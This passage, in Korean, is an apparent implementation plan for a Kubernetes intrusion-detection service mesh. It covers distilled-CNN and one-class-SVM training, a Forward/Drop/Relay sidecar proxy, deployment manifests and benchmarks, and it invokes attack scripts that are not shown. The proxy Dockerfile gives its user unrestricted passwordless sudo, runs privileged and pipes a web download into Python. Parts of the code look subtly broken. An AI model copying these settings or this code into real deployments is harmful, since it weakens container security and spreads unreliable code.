    """CNN-2x16: 2 conv layers, 16 filters"""
    def __init__(self, feat_dim=128):
        super().__init__()
        self.conv = nn.Sequential(
            nn.Conv2d(1, 16, kernel_size=(3, 3), padding=1), nn.ReLU(),
            nn.Conv2d(16, 16, kernel_size=(3, 3), padding=1), nn.ReLU(),
            nn.AdaptiveAvgPool2d((4, 4)),
        )
        self.fc = nn.Linear(16 * 4 * 4, feat_dim)

    def forward(self, x):
        h = self.conv(x)
        h = h.view(h.size(0), -1)
        return F.normalize(self.fc(h), dim=1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--data', required=True)
    parser.add_argument('--teacher', required=True, help='teacher.pth 경로')
    parser.add_argument('--out', required=True)
    parser.add_argument('--epochs', type=int, default=30)
    parser.add_argument('--batch', type=int, default=64)
    args = parser.parse_args()

    X = np.load(os.path.join(args.data, 'X.npy'))
    y = np.load(os.path.join(args.data, 'y.npy'))
    X_benign = X[y == 0]
    X_t = torch.from_numpy(X_benign).permute(0, 2, 1).unsqueeze(1)
    loader = DataLoader(TensorDataset(X_t), batch_size=args.batch, shuffle=True)

    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')

    teacher = TeacherEncoder().to(device)
    teacher.load_state_dict(torch.load(args.teacher, map_location=device))
    teacher.eval()

    student = StudentEncoder().to(device)
    opt = torch.optim.Adam(student.parameters(), lr=1e-3)
    mse = nn.MSELoss()

    for epoch in range(args.epochs):
        total = 0
        for (x,) in loader:
            x = x.to(device)
            with torch.no_grad():
                t_feat = teacher(x)
            s_feat = student(x)
            loss = mse(s_feat, t_feat)
            opt.zero_grad(); loss.backward(); opt.step()
            total += loss.item()
        print(f"Epoch {epoch+1}/{args.epochs} KD loss={total/len(loader):.6f}")

    os.makedirs(args.out, exist_ok=True)
    torch.save(student.state_dict(), os.path.join(args.out, 'student.pth'))
    print(f"[+] Student 저장: {args.out}/student.pth")
```

- [ ] **Step 2: train_ocsvm.py 작성**

```python
# model-training/train_ocsvm.py
import os, argparse
import numpy as np
import torch
from sklearn.svm import OneClassSVM
import joblib
from train_student_kd import StudentEncoder

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--data', required=True)
    parser.add_argument('--student', required=True, help='student.pth 경로')
    parser.add_argument('--out', required=True)
    args = parser.parse_args()

    X = np.load(os.path.join(args.data, 'X.npy'))
    y = np.load(os.path.join(args.data, 'y.npy'))
    X_benign = X[y == 0]
    X_t = torch.from_numpy(X_benign).permute(0, 2, 1).unsqueeze(1)

    device = torch.device('cpu')
    model = StudentEncoder().to(device)
    model.load_state_dict(torch.load(args.student, map_location=device))
    model.eval()

    print("[*] 임베딩 추출 중...")
    with torch.no_grad():
        feats = model(X_t).numpy()

    print(f"[*] OCSVM 학습 중... ({feats.shape})")
    ocsvm = OneClassSVM(kernel='rbf', nu=0.1, gamma='scale')
    ocsvm.fit(feats)

    os.makedirs(args.out, exist_ok=True)
    joblib.dump(ocsvm, os.path.join(args.out, 'ocsvm.pkl'))
    print(f"[+] OCSVM 저장: {args.out}/ocsvm.pkl")
```

- [ ] **Step 3: export_torchscript.py 작성**

```python
# model-training/export_torchscript.py
import os, argparse
import torch
from train_student_kd import StudentEncoder

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--student', required=True, help='student.pth 경로')
    parser.add_argument('--out', required=True)
    args = parser.parse_args()

    model = StudentEncoder()
    model.load_state_dict(torch.load(args.student, map_location='cpu'))
    model.eval()

    example = torch.zeros(1, 1, 1479, 5)
    traced = torch.jit.trace(model, example)

    os.makedirs(args.out, exist_ok=True)
    out_path = os.path.join(args.out, 'student_ts.pt')
    traced.save(out_path)
    print(f"[+] TorchScript 저장: {out_path}")

    # 추론 확인
    loaded = torch.jit.load(out_path)
    out = loaded(example)
    print(f"[+] 추론 확인: output shape={out.shape}")
```

- [ ] **Step 4: 전체 파이프라인 실행 (GPU 서버)**

```bash
# auth-service 전체 파이프라인
SERVICE=auth-service
python model-training/train_student_kd.py \
  --data ./data/$SERVICE/ --teacher ./models/$SERVICE/teacher.pth \
  --out ./models/$SERVICE/ --epochs 30
python model-training/train_ocsvm.py \
  --data ./data/$SERVICE/ --student ./models/$SERVICE/student.pth \
  --out ./models/$SERVICE/
python model-training/export_torchscript.py \
  --student ./models/$SERVICE/student.pth --out ./models/$SERVICE/

ls ./models/auth-service/
# 예상: teacher.pth  student.pth  student_ts.pt  ocsvm.pkl
```

post-service, comment-service 동일하게 실행.

- [ ] **Step 5: 커밋**

```bash
git add model-training/train_student_kd.py model-training/train_ocsvm.py model-training/export_torchscript.py
git commit -m "feat: Student KD 학습, OCSVM 학습, TorchScript 변환 스크립트 추가"
```

---

### Task 3-4: 모델 성능 평가

**Files:**
- Create: `model-training/evaluate.py`

- [ ] **Step 1: evaluate.py 작성**

```python
# model-training/evaluate.py
import os, argparse
import numpy as np
import torch
import joblib
from sklearn.metrics import precision_score, recall_score, f1_score, roc_auc_score
from train_student_kd import StudentEncoder

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--data', required=True)
    parser.add_argument('--model-dir', required=True, help='student_ts.pt + ocsvm.pkl 디렉토리')
    args = parser.parse_args()

    X = np.load(os.path.join(args.data, 'X.npy'))
    y_true = np.load(os.path.join(args.data, 'y.npy'))

    X_t = torch.from_numpy(X).permute(0, 2, 1).unsqueeze(1)
    model = torch.jit.load(os.path.join(args.model_dir, 'student_ts.pt'))
    model.eval()
    ocsvm = joblib.load(os.path.join(args.model_dir, 'ocsvm.pkl'))

    with torch.no_grad():
        feats = model(X_t).numpy()

    scores = ocsvm.decision_function(feats)
    y_pred = (scores < 0).astype(int)  # 0=정상, 1=이상

    print(f"Precision : {precision_score(y_true, y_pred):.4f}")
    print(f"Recall    : {recall_score(y_true, y_pred):.4f}")
    print(f"F1-score  : {f1_score(y_true, y_pred):.4f}")
    print(f"ROC-AUC   : {roc_auc_score(y_true, scores):.4f}")
```

- [ ] **Step 2: 평가 실행**

```bash
python model-training/evaluate.py \
  --data ./data/auth-service/ \
  --model-dir ./models/auth-service/
```
Expected: ROC-AUC ≥ 0.90

- [ ] **Step 3: 커밋**

```bash
git add model-training/evaluate.py
git commit -m "feat: 서비스별 탐지 모델 성능 평가 스크립트 추가"
```

---

## Phase 4: Data Plane Proxy 완성

### Task 4-1: proxy_detection.py Drop/Relay/Forward 구현

**Files:**
- Create: `servicemesh/dataplane/proxy/proxy_detection.py`
- Copy: `packet_parser_stack.c` (lightweight_servicemesh에서 복사)

- [ ] **Step 1: servicemesh/dataplane/proxy/proxy_detection.py 작성**

```python
# servicemesh/dataplane/proxy/proxy_detection.py
"""
논문 Algorithm 1 완전 구현: Forward / Drop / Relay
- Forward: 정상 트래픽 또는 검증 통과 요청
- Drop   : 이상 탐지 + Request Verifier가 미확인 요청으로 판정
- Relay  : 이상 탐지 + 응답 트래픽 → 다른 Pod에서 정상 응답으로 대체
"""
import asyncio, socket, struct, ctypes, logging, os, json
import numpy as np
import torch
import joblib
import aiohttp
import uvloop
from aiohttp import web

PROXY_PORT  = int(os.environ.get('PROXY_PORT', 9011))
TARGET_PORT = int(os.environ.get('TARGET_PORT', 8080))
POD_IP      = os.environ.get('POD_IP', '127.0.0.1')
SERVICE_NAME = os.environ.get('SERVICE_NAME', 'default')
CONTROL_PLANE_URL = os.environ.get('CONTROL_PLANE_URL', 'http://control-plane-service:8080')

WIN_SIZE, VEC_LEN, FEAT_DIM = 5, 1479, 128
H, W = 1479, 5
THRESHOLD = 0.0   # OCSVM score < 0 → 이상
IDLE_TIMEOUT = 1

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# 모델 로드
model = torch.jit.load(f'./model/student_ts.pt').eval()
ocsvm = joblib.load(f'./model/ocsvm.pkl')

# C 파서
c_parser = ctypes.CDLL('./proxy/packet_parser_stack.so')
c_parser.parse_and_stack.argtypes = [
    ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t,
    ctypes.POINTER(ctypes.c_float), ctypes.c_uint32
]
c_parser.parse_and_stack.restype = ctypes.c_int
c_parser.init_session_storage.restype = ctypes.c_int
assert c_parser.init_session_storage() == 0

# Control Plane에서 수신한 Peer Pod IP 목록
peer_pods = []   # [{"name": ..., "ip": ...}, ...]

@torch.jit.script
def preprocess(flat: torch.Tensor) -> torch.Tensor:
    return flat.reshape(1, 1, 1479, 5)

def is_malicious(data: bytes, session_id: int) -> bool:
    out_stack = (ctypes.c_float * (WIN_SIZE * VEC_LEN))()
    raw_buf = (ctypes.c_uint8 * len(data)).from_buffer_copy(data)
    ret = c_parser.parse_and_stack(raw_buf, len(data), out_stack, session_id)
    if ret != 1:
        return False
    stacked = np.ctypeslib.as_array(out_stack, shape=(H * W,))
    tensor = torch.from_numpy(stacked).float().div(255.0)
    img = preprocess(tensor).contiguous().unsqueeze(0)
    with torch.no_grad():
        feat = model(img).cpu().numpy()
    score = ocsvm.decision_function(feat)[0]
    return bool(score < THRESHOLD)

def get_session_id(data: bytes) -> int:
    try:
        src_ip   = int.from_bytes(data[26:30], 'big')
        dst_ip   = int.from_bytes(data[30:34], 'big')
        src_port = struct.unpack("!H", data[34:36])[0]
        dst_port = struct.unpack("!H", data[36:38])[0]
        proto    = data[23]
        return (src_ip ^ dst_ip ^ src_port ^ dst_port ^ proto) % 65536
    except Exception:
        return 0

async def verify_request(data: bytes) -> bool:
    """Control Plane Request Verifier에 검증 요청"""
    try:
        sig = data[:64].hex()   # 요청 앞 64바이트를 시그니처로 사용
        payload = {"pod_ip": POD_IP, "signature_data": sig}
        async with aiohttp.ClientSession() as s:
            async with s.post(
                f"{CONTROL_PLANE_URL}/send/internal_request_body",
                json=payload, timeout=aiohttp.ClientTimeout(total=1)
            ) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    return result.get("result") == "valid"
    except Exception as e:
        logger.warning(f"Request Verifier 호출 실패: {e}")
    return False

async def relay_from_peer(original_request: bytes) -> bytes | None:
    """Peer Pod에 동일 요청을 보내 응답을 가져옴 (Relay)"""
    if not peer_pods:
        return None
    peer = peer_pods[0]
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(peer['ip'], TARGET_PORT), timeout=2
        )
        writer.write(original_request)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(65536), timeout=2)
        writer.close()
        return response
    except Exception as e:
        logger.warning(f"Relay 실패 ({peer['ip']}): {e}")
    return None

class Proxy:
    def __init__(self):
        self._req_buf: dict[int, bytes] = {}   # session_id → 마지막 요청 raw data

    async def handle_client(self, client_reader, client_writer):
        remote_writer = None
        try:
            addr = client_writer.get_extra_info('peername')
            target_ip, target_port = await self._get_target(addr, client_writer)
            remote_reader, remote_writer = await asyncio.open_connection(target_ip, target_port)

            tasks = [
                asyncio.create_task(self._transfer(client_reader, remote_writer, 'request')),
                asyncio.create_task(self._transfer(remote_reader, client_writer, 'response')),
            ]
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED, timeout=IDLE_TIMEOUT)
            for t in pending:
                t.cancel()
        finally:
            for w in [remote_writer, client_writer]:
                if w:
                    await self._close(w)

    async def _get_target(self, addr, client_writer):
        src_ip, _ = addr
        try:
            SO_ORIGINAL_DST = 80
            sock = client_writer.get_extra_info('socket')
            dst = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
            dst_port, dst_ip = struct.unpack("!2xH4s8x", dst)
            dst_ip = socket.inet_ntoa(dst_ip)
            if src_ip == POD_IP:
                return dst_ip, dst_port
            return dst_ip, TARGET_PORT
        except Exception as e:
            logger.error(f"get_target 오류: {e}")
            raise

    async def _transfer(self, reader, writer, direction: str):
        """direction: 'request' or 'response'"""
        while not reader.at_eof():
            data = await reader.read(16384)
            if not data:
                break

            session_id = get_session_id(data)

            if direction == 'request':
                self._req_buf[session_id] = data

            if is_malicious(data, session_id):
                if direction == 'response':
                    # Relay: Peer Pod에서 정상 응답 가져오기
                    original_req = self._req_buf.get(session_id, b'')
                    relayed = await relay_from_peer(original_req) if original_req else None
                    if relayed:
                        writer.write(relayed)
                        await writer.drain()
                        logger.warning(f"[RELAY] session={session_id}")
                    # relayed 없으면 그냥 Drop (아무것도 쓰지 않음)
                else:
                    # Drop: Request Verifier 확인
                    valid = await verify_request(data)
                    if valid:
                        writer.write(data)
                        await writer.drain()
                    else:
                        logger.warning(f"[DROP] session={session_id}")
            else:
                # Forward
                writer.write(data)
                await writer.drain()

    async def _close(self, writer):
        if writer and not writer.is_closing():
            try:
                writer.write_eof()
            except Exception:
                pass
            try:
                writer.close()
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass

# Control Plane에서 Peer Pod IP 수신 엔드포인트
async def receive_pods_ip(request):
    global peer_pods
    data = await request.json()
    peer_pods = data.get('pods_ip', [])
    logger.info(f"Peer Pods 수신: {peer_pods}")
    return web.Response(status=200, text='OK')

async def start_api_server():
    app = web.Application()
    app.router.add_post('/receive/pods_ip', receive_pods_ip)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PROXY_PORT)
    await site.start()
    return runner

async def main():
    proxy = Proxy()
    api_runner = await start_api_server()
    server = await asyncio.start_server(proxy.handle_client, '0.0.0.0', PROXY_PORT)
    logger.info(f"Proxy listening :{PROXY_PORT}, target :{TARGET_PORT}")
    async with server:
        await server.serve_forever()

if __name__ == '__main__':
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    asyncio.run(main())
```

- [ ] **Step 2: packet_parser_stack.c 복사**

```bash
cp "../../lightweight_servicemesh/Lightweight_Service_Mesh_for_Intrusion_Detection_using_KD-CNN_in_Cloud-Native_Environment/ServiceMesh/DataPlane/Proxy/packet_parser_stack.c" \
   servicemesh/dataplane/proxy/
```

- [ ] **Step 3: 커밋**

```bash
git add servicemesh/dataplane/proxy/
git commit -m "feat: Proxy Drop/Relay/Forward 로직 구현 (논문 Algorithm 1 완전 구현)"
```

---

### Task 4-2: Data Plane Dockerfile 및 K8s 매니페스트

**Files:**
- Create: `servicemesh/dataplane/Dockerfile`
- Create: `servicemesh/dataplane/requirements.txt`
- Create: `servicemesh/dataplane/iptables.sh`
- Modify: `k8s/auth-service/deployment.yaml` (Sidecar 추가)

- [ ] **Step 1: Dockerfile 작성**

```dockerfile
# servicemesh/dataplane/Dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    python3.10 python3.10-dev python3-pip \
    gcc make net-tools iptables-persistent sudo curl \
    && rm -rf /var/lib/apt/lists/*

RUN update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.10 1
RUN curl -sS https://bootstrap.pypa.io/get-pip.py | python3.10

WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
RUN pip install torch==2.4.1 --index-url https://download.pytorch.org/whl/cpu

COPY proxy/ ./proxy/
COPY iptables.sh .
RUN gcc -O2 -shared -fPIC -o ./proxy/packet_parser_stack.so ./proxy/packet_parser_stack.c

RUN useradd -m -u 5555 proxyuser && echo "proxyuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
RUN chown -R proxyuser:proxyuser /app && chmod +x iptables.sh

# 모델은 PVC로 마운트 (/app/model/)
RUN mkdir -p /app/model && chmod 777 /app/model

ENTRYPOINT ["/bin/sh", "-c", "/app/iptables.sh && python3 /app/proxy/proxy_detection.py"]
```

- [ ] **Step 2: requirements.txt 작성**

```
aiohttp==3.10.11
uvloop==0.21.0
numpy==1.26.4
scikit-learn==1.5.2
joblib==1.4.2
```

- [ ] **Step 3: iptables.sh 복사 (기존 활용)**

```bash
cp "../../lightweight_servicemesh/.../ServiceMesh/DataPlane/iptables.sh" \
   servicemesh/dataplane/iptables.sh
```

- [ ] **Step 4: auth-service deployment.yaml에 Sidecar 추가**

```yaml
# k8s/auth-service/deployment.yaml (Sidecar 컨테이너 추가)
      containers:
        - name: auth-service          # 기존 Main Container
          image: <REGISTRY>/auth-service:latest
          ports:
            - containerPort: 8080
          # ... (기존 env 유지)

        - name: reverse-proxy         # Sidecar Proxy 추가
          image: <REGISTRY>/deepmesh-proxy:latest
          env:
            - name: TARGET_PORT
              value: "8080"
            - name: PROXY_PORT
              value: "9011"
            - name: POD_IP
              valueFrom:
                fieldRef:
                  fieldPath: status.podIP
            - name: SERVICE_NAME
              value: "auth-service"
            - name: CONTROL_PLANE_URL
              value: "http://control-plane-service.deepmesh:8080"
          securityContext:
            privileged: true
            capabilities:
              add: ["NET_ADMIN"]
          resources:
            requests:
              cpu: "1000m"
              memory: "512Mi"
            limits:
              cpu: "1000m"
          volumeMounts:
            - name: model-volume
              mountPath: /app/model
      volumes:
        - name: model-volume
          persistentVolumeClaim:
            claimName: model-pvc-auth
```

post-service, comment-service에도 동일하게 Sidecar 추가 (`SERVICE_NAME`과 `model-pvc-*`만 변경).

- [ ] **Step 5: 모델 PVC 생성 및 배포**

```bash
# 모델 파일을 PVC에 업로드
kubectl apply -f k8s/auth-service/
kubectl apply -f k8s/post-service/
kubectl apply -f k8s/comment-service/
kubectl get pods -n deepmesh
```
Expected: 각 Pod에 2/2 컨테이너 Running

- [ ] **Step 6: 커밋**

```bash
git add servicemesh/dataplane/ k8s/auth-service/ k8s/post-service/ k8s/comment-service/
git commit -m "feat: Data Plane Sidecar Proxy Dockerfile 및 K8s Sidecar 주입 설정 추가"
```

---

## Phase 5: Control Plane 완성

### Task 5-1: Control Plane masterNode.py deepmesh 적용

**Files:**
- Create: `servicemesh/controlplane/masterNode.py`
- Create: `servicemesh/controlplane/Dockerfile`
- Create: `servicemesh/controlplane/requirements.txt`
- Create: `k8s/control-plane/deployment.yaml`
- Create: `k8s/control-plane/service.yaml`

- [ ] **Step 1: masterNode.py 작성 (기존 코드에서 deepmesh 네임스페이스 적용)**

기존 `masterNode.py`를 복사 후 다음 부분만 수정:

```python
# servicemesh/controlplane/masterNode.py 수정 사항

# 1. NAMESPACE 환경변수 추가
NAMESPACE = os.environ.get('NAMESPACE', 'deepmesh')

# 2. fetch_pods_ip() 내 kubectl 명령에 namespace 필터 적용
cmd = [
    "kubectl", "get", "pods", "-n", NAMESPACE, "-o",
    "custom-columns=NAMESPACE:.metadata.namespace,POD:.metadata.name,"
    "REPLICASET:.metadata.ownerReferences[0].name,"
    "IP:.status.podIP,CONTAINERS:.spec.containers[*].name"
]

# 3. model_process import 제거 (deepmesh에서 불필요)
# import model_process  ← 삭제

# 4. start_internal_request_validation에서 model_process 라우트 제거
# app.router.add_route('POST', '/get/data', model_process.create_get_data())  ← 삭제

# 5. main()에서 start_model_process 제거
# asyncio.create_task(start_model_process(masterNodeIP, workerNodeIPs))  ← 삭제
```

- [ ] **Step 2: Dockerfile 작성**

```dockerfile
# servicemesh/controlplane/Dockerfile
FROM python:3.10-slim
RUN apt-get update && apt-get install -y kubectl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY masterNode.py .
CMD ["python3", "masterNode.py"]
```

- [ ] **Step 3: requirements.txt 작성**

```
aiohttp==3.10.11
```

- [ ] **Step 4: k8s/control-plane/deployment.yaml 작성**

```yaml
# k8s/control-plane/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: control-plane
  namespace: deepmesh
spec:
  replicas: 1
  selector:
    matchLabels:
      app: control-plane
  template:
    metadata:
      labels:
        app: control-plane
    spec:
      serviceAccountName: control-plane-sa   # kubectl 권한 필요
      containers:
        - name: control-plane
          image: <REGISTRY>/deepmesh-control-plane:latest
          env:
            - name: NAMESPACE
              value: "deepmesh"
            - name: INTERVAL
              value: "10"
          ports:
            - containerPort: 8080
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: control-plane-sa
  namespace: deepmesh
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: control-plane-role
rules:
  - apiGroups: [""]
    resources: ["pods", "nodes"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: control-plane-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: control-plane-role
subjects:
  - kind: ServiceAccount
    name: control-plane-sa
    namespace: deepmesh
```

- [ ] **Step 5: k8s/control-plane/service.yaml 작성**

```yaml
# k8s/control-plane/service.yaml
apiVersion: v1
kind: Service
metadata:
  name: control-plane-service
  namespace: deepmesh
spec:
  selector:
    app: control-plane
  ports:
    - port: 8080
      targetPort: 8080
```

- [ ] **Step 6: 배포 및 확인**

```bash
kubectl apply -f k8s/control-plane/
kubectl wait --for=condition=ready pod -l app=control-plane -n deepmesh --timeout=60s
kubectl logs -l app=control-plane -n deepmesh
```
Expected: `Running on http://0.0.0.0:8080` 로그 출력

- [ ] **Step 7: Request Verifier API 동작 확인**

```bash
# 요청 등록 → 검증 흐름 확인
CTRL_IP=$(kubectl get svc control-plane-service -n deepmesh -o jsonpath='{.spec.clusterIP}')
kubectl run curl-test --image=curlimages/curl -it --rm -n deepmesh -- \
  curl -X POST http://$CTRL_IP:8080/send/internal_request_body \
  -H 'Content-Type: application/json' \
  -d '{"pod_ip":"10.0.0.1","signature_data":"aabbcc"}'
```
Expected: `{"result":"invalid"}` (첫 요청은 항상 invalid)

- [ ] **Step 8: 커밋**

```bash
git add servicemesh/controlplane/ k8s/control-plane/
git commit -m "feat: Control Plane masterNode deepmesh 적용 및 K8s 배포 설정 추가"
```

---

## Phase 6: 통합 테스트 및 성능 측정

### Task 6-1: 탐지 성능 평가

**Files:**
- Create: `evaluation/detection_metrics.py`

- [ ] **Step 1: detection_metrics.py 작성**

```python
# evaluation/detection_metrics.py
"""
실제 K8s 환경에서 Benign/Attack 트래픽 전송 후 Proxy 로그 수집 → 메트릭 계산
"""
import subprocess, json
import numpy as np
from sklearn.metrics import precision_score, recall_score, f1_score, roc_auc_score

NAMESPACE = "deepmesh"
SERVICES = ["auth-service", "post-service", "comment-service"]

def collect_proxy_logs(service: str) -> list[dict]:
    """Proxy 컨테이너 로그에서 DROP/RELAY/FORWARD 이벤트 수집"""
    result = subprocess.run([
        "kubectl", "logs", "-l", f"app={service}",
        "-c", "reverse-proxy", "-n", NAMESPACE, "--tail=10000"
    ], capture_output=True, text=True)
    events = []
    for line in result.stdout.splitlines():
        for action in ["DROP", "RELAY", "FORWARD"]:
            if f"[{action}]" in line:
                events.append({"action": action, "line": line})
    return events

if __name__ == '__main__':
    for svc in SERVICES:
        events = collect_proxy_logs(svc)
        print(f"\n=== {svc} ===")
        for action in ["DROP", "RELAY", "FORWARD"]:
            count = sum(1 for e in events if e["action"] == action)
            print(f"  {action}: {count}")
```

- [ ] **Step 2: 통합 시나리오 실행**

```bash
# Benign 트래픽 흘리기
locust -f data-collection/locust/auth_locustfile.py \
  --host http://<INGRESS_IP> --users 10 --spawn-rate 2 --run-time 120s --headless &

# 공격 시나리오 실행
python data-collection/attack/brute_force.py http://<INGRESS_IP>/api/auth/login
python data-collection/attack/jwt_abuse.py http://<INGRESS_IP>/api/posts

wait
python evaluation/detection_metrics.py
```
Expected: RELAY/DROP 이벤트 > 0, FORWARD 이벤트 다수

- [ ] **Step 3: 커밋**

```bash
git add evaluation/detection_metrics.py
git commit -m "feat: Proxy 탐지 이벤트 수집 및 성능 평가 스크립트 추가"
```

---

### Task 6-2: 네트워크 오버헤드 벤치마크

**Files:**
- Create: `evaluation/benchmark.sh`

- [ ] **Step 1: benchmark.sh 작성**

```bash
#!/bin/bash
# evaluation/benchmark.sh
# wrk2로 Latency, Throughput 측정
# 사용법: ./evaluation/benchmark.sh <target-url>

TARGET=${1:-"http://localhost/api/auth/login"}
DURATION=30
THREADS=4
CONNECTIONS=10
RATE=100  # req/s

echo "==============================="
echo " deepmesh Service Mesh Benchmark"
echo " Target : $TARGET"
echo " Duration: ${DURATION}s, Rate: ${RATE} req/s"
echo "==============================="

wrk2 -t$THREADS -c$CONNECTIONS -d${DURATION}s -R$RATE \
  --latency $TARGET 2>&1 | tee ./evaluation/results_$(date +%Y%m%d_%H%M%S).txt

echo "[+] 결과 저장 완료"
```

- [ ] **Step 2: 3가지 구성으로 측정**

```bash
# 1. Proxy 없음 (baseline)
# deployment에서 sidecar 제거 후 측정
./evaluation/benchmark.sh http://<INGRESS_IP>/api/auth/login

# 2. Detection 비활성 (THRESHOLD=999 로 환경변수 변경)
# 3. Detection 활성 (기본)
```

- [ ] **Step 3: 커밋 및 Phase 태그**

```bash
git add evaluation/benchmark.sh
git commit -m "feat: wrk2 기반 네트워크 오버헤드 벤치마크 스크립트 추가"
git tag phase6
```

---

## Phase별 완료 태그

```bash
git tag phase1   # K8s 마이그레이션 완료
git tag phase2   # 데이터 수집 완료
git tag phase3   # 모델 학습 완료
git tag phase4   # Data Plane 완료
git tag phase5   # Control Plane 완료
git tag phase6   # 통합 테스트 완료
```
